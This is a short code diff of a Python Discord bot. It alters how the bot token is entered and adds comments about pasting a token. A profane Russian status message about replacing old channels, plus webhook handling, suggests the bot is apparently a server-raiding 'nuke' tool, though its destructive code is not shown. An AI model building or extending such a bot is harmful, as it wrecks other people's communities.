@@ -2,7 +2,8 @@ import discord
 import asyncio
 from discord.ext import commands
 
-token = input("чювак вводи токен: ")
+# сюда токен если кто не понял
+token = input("")
 
 
 intents = discord.Intents.default()
@@ -65,7 +66,9 @@ async def moonik(ctx):
             print(f"❌ Ошибка при работе с вебхуком в канале {channel.name}: {e}")
 
     print("✅ Новые каналы созданы а старые выебаны в рот!")
-
+# сюда тоже можно токен
+# только нужно :
+# bot.run("")
 bot.run(token)
 # bot by 
 # hilmanzz [discord]
